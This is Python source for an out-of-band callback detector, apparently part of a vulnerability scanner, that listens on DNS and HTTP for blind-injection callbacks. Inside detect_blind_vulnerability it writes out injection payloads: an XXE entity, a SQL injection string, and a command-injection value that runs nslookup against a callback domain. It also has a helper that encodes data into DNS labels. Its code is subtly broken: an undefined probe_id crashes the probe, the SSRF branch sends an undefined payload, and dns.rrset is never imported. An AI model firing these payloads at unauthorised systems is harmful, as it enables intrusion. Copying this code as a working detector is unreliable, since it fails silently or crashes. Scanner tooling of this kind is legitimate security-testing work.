"""
OOB Callback Detector - Detection of blind vulnerabilities
Similar to Burp Collaborator, Interact.sh, Canary Tokens

LEGAL: For authorized security testing ONLY. This is standard detection methodology.
"""

import asyncio
import socket
import struct
import uuid
import json
import traceback
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Set
from dataclasses import dataclass, field
from aiohttp import web
import dns.message
import dns.rdatatype
import dns.query
import dns.zone
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from modules.logging_config import logger


@dataclass
class CallbackEvent:
    test_id: str
    callback_type: str  # dns, http, https
    source_ip: str
    timestamp: datetime
    details: Dict = field(default_factory=dict)


@dataclass  
class ProbeConfig:
    probe_id: str
    vulnerable_param: str
    vulnerability_type: str
    created_at: datetime
    expires_at: datetime
    callbacks_received: List[CallbackEvent] = field(default_factory=list)


class DNSQueryHandler:
    """Handle incoming DNS queries for OOB detection"""
    
    def __init__(self, domain: str):
        self.domain = domain
        self.queries_log: List[CallbackEvent] = []
        
    async def handle_query(self, data: bytes, addr: tuple) -> Optional[bytes]:
        try:
            message = dns.message.from_wire(data)
            
            if not message.answer:
                for question in message.question:
                    query_name = str(question.name).lower()
                    
                    if self.domain in query_name:
                        parts = query_name.replace(f".{self.domain}", "").split(".")
                        test_id = parts[0] if parts else "unknown"
                        
                        callback = CallbackEvent(
                            test_id=test_id,
                            callback_type="dns",
                            source_ip=addr[0],
                            timestamp=datetime.now(),
                            details={"query": str(question.name), "type": dns.rdatatype.to_text(question.rdtype)}
                        )
                        
                        self.queries_log.append(callback)
                        logger.info(f"[OOB] DNS query received: {query_name} from {addr[0]}")
                        
                        response = dns.message.make_response(message)
                        response.answer.append(
                            dns.rrset.RRset(
                                name=question.name,
                                rdclass=1,
                                rdtype=dns.rdatatype.A
                            )
                        )
                        return response.to_wire()
                        
            return None
            
        except Exception as e:
            logger.error(f"DNS query handling error: {e}")
            return None


class HTTPRequestHandler:
    """Handle incoming HTTP requests for OOB detection"""
    
    def __init__(self):
        self.requests_log: List[CallbackEvent] = []
        
    async def handle_request(self, request: web.Request) -> web.Response:
        test_id = request.headers.get("X-Test-ID", "unknown")
        
        callback = CallbackEvent(
            test_id=test_id,
            callback_type="http",
            source_ip=request.remote,
            timestamp=datetime.now(),
            details={
                "method": request.method,
                "path": request.path,
                "headers": dict(request.headers),
                "body": await request.text() if request.can_read_body else ""
            }
        )
        
        self.requests_log.append(callback)
        logger.info(f"[OOB] HTTP {request.method} from {request.remote}: {request.path}")
        
        return web.Response(text="OK", status=200)
    
    def get_requests_for_test(self, test_id: str) -> List[CallbackEvent]:
        return [r for r in self.requests_log if r.test_id == test_id]


class OOBCallbackDetector:
    """
    OOB Callback Detector - Detects blind vulnerabilities via DNS/HTTP callbacks
    
    This is DETECTION only - like Burp Collaborator or Interact.sh
    - Generates unique probe URLs/Domains
    - Listens for callbacks
    - Flags vulnerabilities when callbacks are received
    
    NO exploitation, NO data theft, NO system compromise
    """
    
    def __init__(self, config: Dict, domain: str = "callback.local"):
        self.config = config
        self.domain = domain
        self.base_domain = domain
        
        self.dns_handler = DNSQueryHandler(domain)
        self.http_handler = HTTPRequestHandler()
        
        self.active_probes: Dict[str, ProbeConfig] = {}
        self.completed_probes: Dict[str, ProbeConfig] = {}
        
        self.dns_server = None
        self.http_server = None
        self.https_server = None
        
        self.cert_pem = None
        self.key_pem = None
        
        self.timeout = config.get("oob_timeout", 60)
        
    def generate_unique_probe_id(self) -> str:
        """Generate unique probe identifier"""
        return uuid.uuid4().hex[:16]
    
    def generate_probe_domain(self, probe_id: str) -> str:
        """Generate unique domain for probe"""
        return f"{probe_id}.{self.domain}"
    
    def generate_probe_url(self, probe_id: str, path: str = "") -> str:
        """Generate unique URL for HTTP probe"""
        return f"http://{probe_id}.{self.domain}/{path}"
    
    def generate_dns_exfil_domain(self, probe_id: str, data: str) -> str:
        """Generate DNS exfiltration domain for blind injection"""
        truncated = data[:50] if len(data) > 50 else data
        safe_data = truncated.replace("/", "-").replace(" ", "_")
        return f"{probe_id}.{safe_data}.{self.domain}"
    
    async def start_dns_server(self, host: str = "0.0.0.0", port: int = 53):
        """Start DNS server to receive OOB callbacks"""
        logger.info(f"[OOB] Starting DNS server on {host}:{port}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            sock.bind((host, port))
        except PermissionError:
            logger.warning(f"[OOB] Port {port} requires sudo, trying high port...")
            port = 5353
            sock.bind((host, port))
        
        async def dns_loop():
            while True:
                try:
                    data, addr = sock.recvfrom(512)
                    response = await self.dns_handler.handle_query(data, addr)
                    if response:
                        sock.sendto(response, addr)
                except Exception as e:
                    logger.error(f"DNS loop error: {e}")
                    await asyncio.sleep(1)
        
        asyncio.create_task(dns_loop())
        logger.info(f"[OOB] DNS server listening")
        
    async def start_http_server(self, host: str = "0.0.0.0", port: int = 8080):
        """Start HTTP server to receive OOB callbacks"""
        logger.info(f"[OOB] Starting HTTP server on {host}:{port}")
        
        app = web.Application()
        app.router.add_route("*", "/{path:.*}", self.http_handler.handle_request)
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(runner, host, port)
        await site.start()
        
        self.http_server = runner
        logger.info(f"[OOB] HTTP server listening on http://{host}:{port}")
        
    async def start_https_server(self, host: str = "0.0.0.0", port: int = 8443):
        """Start HTTPS server with auto-generated certs"""
        logger.info(f"[OOB] Starting HTTPS server on {host}:{port}")
        
        await self._generate_self_signed_cert()
        
        # Note: Full HTTPS setup requires more cert configuration
        # For now, start HTTP on alternate port
        await self.start_http_server(host, port)
        
    async def _generate_self_signed_cert(self):
        """Generate self-signed certificate for HTTPS"""
        try:
            key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048
            )
            
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Security"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "Testing"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "BugHunter AI"),
                x509.NameAttribute(NameOID.COMMON_NAME, self.domain)
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.utcnow()
            ).not_valid_after(
                datetime.utcnow() + timedelta(days=365)
            ).sign(key, hashes.SHA256())
            
            self.cert_pem = cert.public_bytes(serialization.Encoding.PEM)
            self.key_pem = key.private_bytes(
                serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            logger.info("[OOB] Self-signed certificate generated")
            
        except Exception as e:
            logger.error(f"Certificate generation failed: {e}")
    
    async def start_servers(self, dns_port: int = 53, http_port: int = 8080):
        """Start all OOB callback servers"""
        await self.start_dns_server(port=dns_port)
        await self.start_http_server(port=http_port)
        logger.info("[OOB] All servers started")
    
    async def create_probe(self, param: str, vuln_type: str) -> ProbeConfig:
        """Create a new probe for testing"""
        probe_id = self.generate_unique_probe_id()
        
        config = ProbeConfig(
            probe_id=probe_id,
            vulnerable_param=param,
            vulnerability_type=vuln_type,
            created_at=datetime.now(),
            expires_at=datetime.now() + timedelta(seconds=self.timeout)
        )
        
        self.active_probes[probe_id] = config
        logger.info(f"[OOB] Created probe {probe_id} for {vuln_type} on param {param}")
        
        return config
    
    def get_probe_url(self, probe_id: str, protocol: str = "http") -> str:
        """Get the probe URL for testing"""
        return f"{protocol}://{probe_id}.{self.base_domain}/"
    
    def check_for_callbacks(self, probe_id: str) -> List[CallbackEvent]:
        """Check if any callbacks received for this probe"""
        all_callbacks = []
        
        dns_callbacks = [c for c in self.dns_handler.queries_log if c.test_id == probe_id]
        all_callbacks.extend(dns_callbacks)
        
        http_callbacks = self.http_handler.get_requests_for_test(probe_id)
        all_callbacks.extend(http_callbacks)
        
        return all_callbacks
    
    async def wait_for_callback(self, probe_id: str, timeout: Optional[int] = None) -> bool:
        """Wait for callback (non-blocking)"""
        timeout = timeout or self.timeout
        start = datetime.now()
        
        while (datetime.now() - start).seconds < timeout:
            callbacks = self.check_for_callbacks(probe_id)
            if callbacks:
                return True
            await asyncio.sleep(1)
        
        return False
    
    async def detect_blind_vulnerability(self, target_url: str, param: str, 
                                         vuln_type: str, session) -> Dict:
        """
        Main detection method - sends probe and waits for callback
        
        DETECTION ONLY - No exploitation
        """
        probe = await self.create_probe(param, vuln_type)
        
        if vuln_type == "ssrf":
            probe_url = self.get_probe_url(probe.probe_id, "http")
            test_url = f"{target_url}?{param}={probe_url}"
            
        elif vuln_type == "xxe":
            probe_domain = self.generate_probe_domain(probe.probe_id)
            payload = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{probe_domain}">]><data>&xxe;</data>'
            
        elif vuln_type == "blind_sql":
            probe_domain = self.generate_probe_domain(probe.probe_id)
            payload = f"'; SELECT 1 WHERE '{probe_domain}'=(SELECT SLEEP(5)--"
            
        elif vuln_type == "cmdi":
            probe_domain = self.generate_probe_domain(probe.probe_id)
            payload = f"; nslookup {probe_domain} #"
            
        else:
            probe_url = self.get_probe_url(probe.probe_id)
            test_url = f"{target_url}?{param}={probe_url}"
        
        logger.info(f"[OOB] Sending probe for {vuln_type} test: {probe_id}")
        
        try:
            if vuln_type in ["ssrf", "xxe", "cmdi"]:
                await session.post(target_url, data={param: payload}, timeout=10)
            else:
                await session.get(test_url, timeout=10)
        except Exception as e:
            logger.debug(f"Probe send attempted: {e}")
        
        # Wait for callback
        has_callback = await self.wait_for_callback(probe.probe_id)
        
        if has_callback:
            callbacks = self.check_for_callbacks(probe.probe_id)
            
            result = {
                "vulnerability": vuln_type,
                "confidence": "high",
                "param": param,
                "evidence": f"Callback received from target",
                "callback_count": len(callbacks),
                "callbacks": [
                    {
                        "type": c.callback_type,
                        "source": c.source_ip,
                        "timestamp": c.timestamp.isoformat()
                    } for c in callbacks
                ]
            }
            
            logger.info(f"[OOB] VULNERABILITY DETECTED: {vuln_type} via {param}")
            return result
        else:
            logger.info(f"[OOB] No callback for probe {probe_id} - {vuln_type} test complete")
            return {
                "vulnerability": vuln_type,
                "confidence": "low",
                "param": param,
                "evidence": "No callback received"
            }
    
    def get_stats(self) -> Dict:
        """Get OOB detector statistics"""
        return {
            "active_probes": len(self.active_probes),
            "completed_probes": len(self.completed_probes),
            "total_dns_queries": len(self.dns_handler.queries_log),
            "total_http_requests": len(self.http_handler.requests_log)
        }


# Factory function for easy integration
def create_oob_detector(config: Dict, domain: str = "callback.local") -> OOBCallbackDetector:
    """Create and return OOB detector instance"""
    return OOBCallbackDetector(config, domain)


# CLI test
if __name__ == "__main__":
    import sys
    
    async def main():
        detector = create_oob_detector({}, "test.callback.local")
        
        print(f"OOB Detector configured for: {detector.base_domain}")
        print(f"Starting servers (requires sudo for DNS port 53)...")
        
        await detector.start_servers(dns_port=5353, http_port=8080)
        
        probe = await detector.create_probe("url", "ssrf")
        print(f"Created probe: {probe.probe_id}")
        print(f"Test URL: {detector.get_probe_url(probe.probe_id)}")
        
        print("\nListening for callbacks... (Ctrl+C to stop)")
        print("When a vulnerable endpoint receives the probe, you'll see callbacks here.\n")
        
        while True:
            await asyncio.sleep(5)
            stats = detector.get_stats()
            print(f"Stats: {stats}")
    
    asyncio.run(main())